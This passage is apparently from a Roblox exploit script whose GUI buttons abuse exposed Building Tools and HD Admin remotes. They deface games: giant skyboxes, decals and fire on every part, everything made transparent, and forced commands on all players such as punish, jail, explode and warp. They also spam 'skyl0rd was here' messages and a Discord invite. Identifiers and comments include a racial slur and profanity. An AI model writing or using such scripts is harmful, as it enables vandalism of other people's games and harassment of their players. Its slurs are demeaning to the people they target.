					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Skyl0rdSky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					SetTrans(v, 0.1)
					MeshResize(v,Vector3.new(19000,19000,19000))
					SetLocked(v,true)
				end
			end
		end
		Sky("12330950245")
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";punish all")
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		wait(0.5)
		RequestCommandSilent:InvokeServer(";servermessage KaaX Was here!")
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_47);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_49()
local script = G2L["49"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local function applyDecorationToPart(part)
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
	
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = 25
					}
				}
			}
	
			local buildingTools = nil
			local player = game:GetService("Players").LocalPlayer
	
			-- Search for the tool in Character and Backpack
			for _, item in pairs(player.Character:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
	
			if not buildingTools then
				for _, item in pairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						buildingTools = item
						break
					end
				end
			end
	
			if buildingTools then
				buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
				buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
			elseif not warned then
				warn("Building tool not found")
				warned = true
			end
		end
	
		local function applyDecorationToAllParts(workspaceObject)
			for _, obj in pairs(workspaceObject:GetDescendants()) do
				if obj:IsA("Part") or obj:IsA("MeshPart") then
					applyDecorationToPart(obj)
				end
			end
		end
	
		applyDecorationToAllParts(workspace)
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_49);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_4b()
local script = G2L["4b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";spin all 2534")
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_4d()
local script = G2L["4d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://105908920374108",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "E" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_4f()
local script = G2L["4f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";speed all 80")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_51()
local script = G2L["51"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";warp all")
		wait(20)
	
		RequestCommandSilent:InvokeServer(";warp all")
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_51);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_53()
local script = G2L["53"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";smoke all")
		wait(20)
	
		RequestCommandSilent:InvokeServer(";smoke all")
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_53);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_55()
local script = G2L["55"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";talk all skyl0rd wuz her")
		wait(5)
	
		RequestCommandSilent:InvokeServer(";chat all hacxored by skyl0rd u aa")
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_55);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_57()
local script = G2L["57"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";time 010")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_57);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_59()
local script = G2L["59"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";time 0")
	
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_59);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_5b()
local script = G2L["5b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";createteam Purple skyl0rd was here!")
		RequestCommandSilent:InvokeServer(";team all skyl0rd wuz here!")
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_5b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_5d()
local script = G2L["5d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		while true do
			RequestCommandSilent:InvokeServer(";time 0")
			task.wait(0.6)
			RequestCommandSilent:InvokeServer(";time 010")
			task.wait(0.6)
		end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_5d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_5f()
local script = G2L["5f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";blur others")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_5f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_61()
local script = G2L["61"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";jail others")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_61);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_63()
local script = G2L["63"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";explode others")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_63);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_65()
local script = G2L["65"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";sm skyl0rd was here lolz")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_65);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_67()
local script = G2L["67"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";sm never put free hd admin in ur game after this one!")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_67);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_69()
local script = G2L["69"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";serverhint gg/Ha3GJCT7")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_69);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_6b()
local script = G2L["6b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 111534403707723
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";fogcolor black")
		RequestCommand:InvokeServer(";time 0")
		wait(0.25)
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
	
	
	
			--HD transparent skybox by skyl0rd
			--LMAOOO
			--===--=-=-==-=DDDDDDDDDDDDDDDDD>>>>>>>>>>>>>>>>
			--++++++++++++
			-----------------========
			------------===================================
			-----------------==========
			------------=
			--=
			--=
	
	
	
	
	
	
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					SetTrans(v, 0)
					MeshResize(v,Vector3.new(99999,99999,99999))
					SetLocked(v,true)
				end
			end
		end
		Sky("111534403707723")
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";fire all")
		RequestCommand:InvokeServer(";paint  all black")
		RequestCommand:InvokeServer(";titler all skyl0rd was here")
		
		RequestCommand:InvokeServer(";removehats all")
	
	
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
